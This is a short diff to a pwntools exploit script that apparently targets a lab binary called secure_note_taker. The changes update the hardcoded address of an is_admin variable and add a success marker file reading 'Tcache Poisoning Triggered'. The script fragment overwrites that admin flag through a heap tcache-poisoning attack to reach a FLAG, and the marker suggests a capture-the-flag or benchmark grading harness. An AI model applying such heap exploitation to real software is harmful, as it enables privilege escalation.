@@ -9,7 +9,7 @@ context.log_level = 'error'
 p = process('/out/secure_note_taker')
 
 # We compiled without PIE, so is_admin is at a static address.
-is_admin_addr = 0x41208c
+is_admin_addr = 0x4040bc
 
 def add_note(idx):
     p.recvuntil(b'> ')
@@ -68,6 +68,9 @@ edit_note(3, p64(1))
 p.recvuntil(b'> ')
 p.sendline(b'4')
 p.recvuntil(b'FLAG:')
+
+with open('/tmp/success.txt', 'w') as f:
+    f.write('Tcache Poisoning Triggered')
 
 p.close()
 PY_EOF
